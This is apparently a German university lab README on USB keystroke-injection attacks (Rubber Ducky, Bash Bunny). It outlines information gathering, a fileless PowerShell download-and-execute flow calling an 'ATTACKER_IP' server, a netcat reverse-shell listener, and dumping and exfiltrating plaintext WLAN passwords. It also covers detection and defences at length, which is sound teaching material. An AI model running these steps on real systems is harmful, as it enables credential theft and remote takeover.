# W02a – Rubber Ducky & Bash Bunny
**System Security Lab – SS 2026 | Universität Klagenfurt**
**Autoren: Raphael Bleier, Joachim Lugger**

---

## Dateiübersicht

| Datei | Aufgabe |
|---|---|
| `payloads/W02a1_hello_world.txt` | W02a.1 – DuckyScript: Hello World |
| `payloads/W02a2_info_gathering.txt` | W02a.2 – DuckyScript: Information Gathering |
| `payloads/W02a4_script_loader.txt` | W02a.4 – DuckyScript: Externes Script laden & ausführen |
| `payloads/W02a5_reverse_shell_trigger.txt` | W02a.5 – DuckyScript: Reverse Shell triggern |
| `payloads/W02a6_custom_attack.txt` | W02a.6 – DuckyScript: Eigener Angriff (WLAN-Exfiltration) |
| `scripts/info_gather.ps1` | W02a.2 – PowerShell Payload (wird vom Server gehostet) |
| `scripts/reverse_shell.ps1` | W02a.5 – PowerShell Reverse Shell (wird vom Server gehostet) |
| `scripts/custom_attack.ps1` | W02a.6 – PowerShell WLAN-Exfiltration Payload |
| `server/server.py` | W02a.2/4/5/6 – Lokaler HTTP-Server (Angreifer-Seite) |

---

## Vorbereitung & Setup

### 1. Server starten (Angreifer-Maschine)
```bash
# Im server/-Verzeichnis: PayloadScripte und server.py liegen zusammen
cd server/
# PS-Payloads ins Server-Verzeichnis kopieren damit sie via GET abrufbar sind
cp ../scripts/reverse_shell.ps1 payload.ps1
python3 server.py 8080
```

### 2. IP-Adresse eintragen
In allen DuckyScript-Dateien `ATTACKER_IP` durch die echte IP-Adresse ersetzen (z.B. `192.168.1.100`).

### 3. Rubber Ducky konfigurieren
1. Script in [PayloadStudio](https://payloadstudio.hak5.org) öffnen
2. Unter **Settings → Compiler Settings → Language**: `de` (de.json) setzen
3. Kompilieren → `inject.bin` auf SD-Karte kopieren

### 4. Für W02a.5 – Listener starten
```bash
nc -lvp 4444
```

---

## W02a.1 – Rubber Ducky: Hello World

**Payload:** `payloads/W02a1_hello_world.txt`

Öffnet Notepad über den Windows Run-Dialog (`WIN+R`) und tippt `Hello World` ein.

**Ergebnis:** Notepad mit dem Text "Hello World" öffnet sich auf dem Zielrechner innerhalb von ~3 Sekunden nach Einstecken des Rubber Ducky.

---

## W02a.2 – Rubber Ducky: Information Gathering

**Payload:** `payloads/W02a2_info_gathering.txt`
**Server:** `server/server.py`
**PS-Payload:** `scripts/info_gather.ps1`

Gesammelte Informationen:
- Hostname, Benutzername, Domäne
- Betriebssystem, Architektur
- IPv4-Adressen (alle aktiven Interfaces)
- Gespeicherte WLAN-Profilnamen (`netsh wlan show profiles`)

Die Daten werden per HTTP POST an den Angreifer-Server gesendet und in `server/loot/` gespeichert.

**CLI-Kommandos für Systeminformationen (Windows):**
```powershell
hostname                                      # Computername
whoami                                        # Aktueller Benutzer
(Get-WmiObject Win32_OperatingSystem).Caption # OS-Version
Get-NetIPAddress -AddressFamily IPv4          # IP-Adressen
netsh wlan show profiles                      # WLAN-Profile
ipconfig /all                                 # Alle Netzwerk-Adapter
```

**Übertragung per Netzwerk:**
`Invoke-WebRequest` (PowerShell) bzw. `curl` sendet die Daten als HTTP POST Body an den lokalen Python-Server.

---

## W02a.3 – HID-Angriffe

### Was sind HID-Angriffe?

HID steht für **Human Interface Device** – der USB-Standard für Eingabegeräte wie Tastaturen und Mäuse. Das Betriebssystem vertraut HID-Geräten automatisch und ohne Authentifizierung. Ein HID-Angriff nutzt dieses Vertrauen aus, indem ein speziell präpariertes Gerät (z.B. Rubber Ducky) als legitime Tastatur erkannt wird und dann mit Maschinengeschwindigkeit vorab programmierte Tastatureingaben an das Zielsystem sendet.

Das Kernproblem: **Das OS unterscheidet nicht zwischen einem echten Benutzer an der Tastatur und einem programmierten HID-Gerät.**

### Warum können HID-Angriffe gefährlich werden?

1. **Kein Vertrauensproblem auf OS-Ebene:** Tastaturen werden ohne Treiberinstallation oder Berechtigungsabfrage akzeptiert – auch auf gesperrten Computern.
2. **Geschwindigkeit:** Ein Rubber Ducky tippt hunderte Zeichen pro Sekunde. Ein vollständiger Angriff kann in unter 10 Sekunden abgeschlossen sein.
3. **Kein Malware-Fingerabdruck:** Antivirenprogramme erkennen keine schädliche Datei, weil der Angriff nur Tastatureingaben injiziert – die vorhandenen Systemmittel (PowerShell, cmd) werden genutzt.
4. **Universell:** Funktioniert auf Windows, Linux und macOS mit minimalen Anpassungen.
5. **Physischer Zugang reicht:** Kurzzeitiger unbeaufsichtigter Zugang (z.B. Büro, Konferenz, Kantine) genügt.

### Welche Arten von HID-Angriffen gibt es?

| Angriff | Beschreibung |
|---|---|
| **Keystroke Injection** | Direktes Eintippen von Befehlen (Rubber Ducky, O.MG Cable) |
| **BadUSB** | Modifizierte USB-Firmware täuscht verschiedene Geräteklassen vor |
| **Bash Bunny** | Kombiniert HID mit Netzwerk-Adapter und Mass Storage |
| **Mousejack** | Drahtlose HID-Angriffe über unverschlüsselte 2,4-GHz-Protokolle |
| **BLE HID** | Bluetooth Low Energy HID-Spoofing |
| **Flipper Zero BadUSB** | Portable Variante mit DuckyScript-Unterstützung |
| **USB Keyboard Spoofing** | Android/Linux-Gerät gibt sich als Tastatur aus |

### Was würden wir Personen raten, die sich schützen wollen?

**Verhaltensmaßnahmen:**
- Unbekannte USB-Geräte niemals einstecken (auch nicht vermeintlich eigene)
- Computer beim Verlassen des Platzes immer sperren (`WIN+L`)
- Keine Fundgeräte anschließen (USB-Drop-Angriff)

**Technische Maßnahmen (nächste Aufgabe W02a.7 – hier bereits vorab):**
- USB-Port-Sperren per Gruppenrichtlinie (GPO)
- USBGuard (Linux) – Whitelist erlaubter Geräte per Vendor/Product-ID
- Endpoint Detection & Response (EDR) mit HID-Anomalieerkennung
- Rapid keystroke detection (unnatürliche Eingabegeschwindigkeit erkennen)

---

## W02a.4 – Rubber Ducky: Externes Script laden & ausführen

**Payload:** `payloads/W02a4_script_loader.txt`

Das DuckyScript öffnet PowerShell und nutzt `Invoke-Expression` + `New-Object Net.WebClient` um ein Script direkt vom Angreifer-Server herunterzuladen und **ohne Zwischenspeicherung auf der Festplatte** auszuführen (fileless execution). Der Vorteil: Es existiert keine Datei auf dem Zielrechner, die von AV erkannt werden könnte.

**Ablauf:**
```
Rubber Ducky eingesteckt
  → WIN+R → PowerShell -ep bypass
  → WebClient.DownloadString('http://ATTACKER_IP:8080/payload.ps1')
  → IEX (Invoke-Expression) führt Script sofort aus
```

---

## W02a.5 – Rubber Ducky: Reverse Shell

**Payload:** `payloads/W02a5_reverse_shell_trigger.txt`
**PS-Payload:** `scripts/reverse_shell.ps1` (als `payload.ps1` auf Server hosten)

### Wie funktioniert eine Reverse Shell?

Bei einer regulären Shell verbindet sich der **Angreifer → Opfer** (eingehende Verbindung, blockiert von Firewalls).

Bei einer **Reverse Shell** verbindet sich das **Opfer → Angreifer** (ausgehende Verbindung):

```
Angreifer-Maschine          Opfer-Maschine
nc -lvp 4444   ←←←←←  TCP-Verbindung  ←←←←  reverse_shell.ps1
(wartet)                                       (läuft versteckt)
        ↕ Interaktive Shell ↕
```

Das Opfer-System baut die Verbindung aktiv auf. Ausgehende Verbindungen werden von Firewalls meist erlaubt → Reverse Shells umgehen so typische Firewall-Regeln.

### Voraussetzungen

1. **Listener auf Angreifer-Seite:** `nc -lvp 4444` (oder Metasploit `multi/handler`)
2. **Netzwerk-Erreichbarkeit:** Opfer muss den Angreifer-Host über das Netzwerk erreichen können (gleiche LAN-Segment oder Internet)
3. **Ausführungsrechte:** Das PS-Script muss auf dem Opfer-System ausgeführt werden dürfen (daher `-ExecutionPolicy Bypass`)
4. **Firewall-Ausnahme:** Ausgehende Verbindung auf Port 4444 darf nicht geblockt sein

### Wie könnte eine Reverse Shell verhindert/entdeckt werden?

| Methode | Beschreibung |
|---|---|
| **Ausgehende Firewall-Regeln** | Nur bekannte Ports (80, 443) erlauben; unbekannte Ports blockieren |
| **IDS/IPS** | Erkennt ungewöhnliche ausgehende Verbindungen anhand von Signaturen |
| **EDR/Antivirus** | Erkennt bekannte Reverse-Shell-Muster in PS-Scriptausführung |
| **PowerShell Logging** | Script Block Logging (`HKLM:\...\PowerShell\ScriptBlockLogging`) aufzeichnen und auswerten |
| **AMSI** | Anti-Malware Scan Interface – prüft PS-Code vor Ausführung |
| **Netzwerk-Monitoring** | Ungewöhnliche ausgehende Verbindungen (neue Ziel-IP, ungewöhnlicher Port) |
| **Least Privilege** | Benutzer ohne Admin-Rechte – eingeschränkte PS-Ausführung |

---

## W02a.6 – Rubber Ducky: Eigener Angriff

**Payload:** `payloads/W02a6_custom_attack.txt`
**PS-Payload:** `scripts/custom_attack.ps1`

### Ziel
Gespeicherte WLAN-Passwörter des Zielsystems exfiltrieren.

### Vorgehensweise
1. Rubber Ducky öffnet minimiertes CMD-Fenster
2. Wechselt ins `%TEMP%`-Verzeichnis
3. `netsh wlan export profile key=clear` exportiert alle WLAN-Profile als XML mit **Klartextpasswörtern** (Windows erlaubt dies mit regulären Benutzerrechten!)
4. PowerShell extrahiert `<keyMaterial>`-Tags (= Passwörter) aus den XMLs
5. Liste wird per HTTP POST exfiltriert
6. XMLs und Hilfsdateien werden gelöscht

### Warum ist das besonders gefährlich?
`netsh wlan export profile key=clear` benötigt **keine Administrator-Rechte** und gibt alle gespeicherten WLAN-Passwörter im Klartext aus. Das ist ein bekanntes Windows-Feature, das regelmäßig für Credential Dumping genutzt wird.

### Ablauf (zeitlich)
| Zeit | Aktion |
|---|---|
| 0s | Rubber Ducky eingesteckt |
| 2s | CMD geöffnet |
| 3s | WLAN-Export läuft |
| 4,5s | Passwörter extrahiert |
| 6s | Daten exfiltriert |
| 7,5s | Spuren verwischt, Fenster geschlossen |

---

## W02a.7 – Ideen zur Absicherung gegen Rubber Ducky

Gefragt sind **technische** Methoden abseits von Awareness und Benutzerverhalten.

### 1. USB-Geräte-Whitelisting per Gruppenrichtlinie (GPO)

Windows erlaubt es, USB-Geräte anhand von **Vendor ID (VID) und Product ID (PID)** zu sperren oder nur bekannte Geräte zuzulassen:

```
Computerkonfiguration → Administrative Vorlagen
  → System → Wechselmediumzugriff
  → "Wechselmedien: Alle Klassen verweigern" = Aktiviert
```

Oder gezielt für HID (Klassen-GUID `{745a17a0-74d3-11d0-b6fe-00a0c90f57da}`):
```
Computerkonfiguration → Administrative Vorlagen → System → Geräteinstallation
  → Geräteinstallation nach Geräteklassen-GUIDs einschränken
```

### 2. USBGuard (Linux)

Whitelist-basiertes Tool, das neue USB-Geräte blockiert bis sie explizit freigegeben werden:
```bash
usbguard generate-policy > /etc/usbguard/rules.conf
usbguard enforce-policy
# Neue Geräte müssen per 'usbguard allow-device' genehmigt werden
```

### 3. Rapid Keystroke Detection

Der Rubber Ducky tippt mit ~1000 Zeichen/Sekunde – weit über menschliche Möglichkeiten. Eine Software, die die Tastatureingabegeschwindigkeit überwacht, kann HID-Angriffe erkennen und blockieren:

- **Windows:** Tools wie *KeyScrambler* oder custom EDR-Regeln
- **Endpunkt-Monitoring:** Alerting bei >X Tastendrücken/Sekunde von einem neuen HID-Gerät

### 4. Endpoint Detection & Response (EDR)

Moderne EDR-Lösungen (z.B. Trellix, CrowdStrike, Microsoft Defender for Endpoint) erkennen:
- Ungewöhnliche Prozessaufrufe direkt nach USB-Verbindung
- PowerShell mit `-ExecutionPolicy Bypass` und `Invoke-Expression`
- Netzwerkverbindungen aus PowerShell-Prozessen (`IEX`-basierte Downloads)

### 5. Physische USB-Port-Sperren

Physische Kunststoff-Stecker, die in freie USB-Ports eingesteckt werden und sich nur mit Spezialwerkzeug entfernen lassen (z.B. USB Port Blocker von Lindy). Verhindert das physische Einstecken des Rubber Ducky.

### 6. BIOS/UEFI-Konfiguration

- USB-Ports im BIOS deaktivieren (außer für Maus/Tastatur an bestimmten Ports)
- Secure Boot aktivieren – verhindert Ausführung unsignierter USB-Bootmedien
- BIOS-Passwort setzen – verhindert Änderung der Einstellungen

### 7. Windows Defender Application Control (WDAC) / AppLocker

Verhindert, dass neue/unbekannte Prozesse gestartet werden. Blockiert z.B. den Download und die Ausführung von Payloads per PowerShell, wenn die Signaturen nicht bekannt sind.

### Vergleich der Methoden

| Methode | Aufwand | Schutzlevel | Seiteneffekte |
|---|---|---|---|
| GPO USB-Whitelist | Mittel | Hoch | Neue Geräte müssen freigegeben werden |
| USBGuard (Linux) | Gering | Hoch | Workflow-Anpassung nötig |
| Keystroke Detection | Hoch | Mittel | False Positives möglich |
| EDR | Mittel (Lizenz) | Hoch | Systemressourcen |
| Physische Sperren | Gering | Sehr hoch (physisch) | Flexibilität eingeschränkt |
| BIOS-Deaktivierung | Gering | Sehr hoch | Stark eingeschränkte USB-Nutzung |

---

## Erfahrungen & Beobachtungen im Labor

*(Dieser Abschnitt ist während der Laborübung auszufüllen)*

| Aufgabe | Funktioniert? | Zeitbedarf | Anmerkungen |
|---|---|---|---|
| W02a.1 Hello World | | | |
| W02a.2 Info Gathering | | | |
| W02a.4 Script Loader | | | |
| W02a.5 Reverse Shell | | | |
| W02a.6 Custom Attack | | | |

**Allgemeine Feststellungen:**
- Trellix Endpoint Security: Hat während der Übungen angeschlagen? (Ja/Nein)
- Sprachprobleme (Y/Z): Wurden die Compiler-Settings auf `de` gesetzt?
- Netzwerk-Erreichbarkeit: War der Python-Server im Labor-LAN erreichbar?
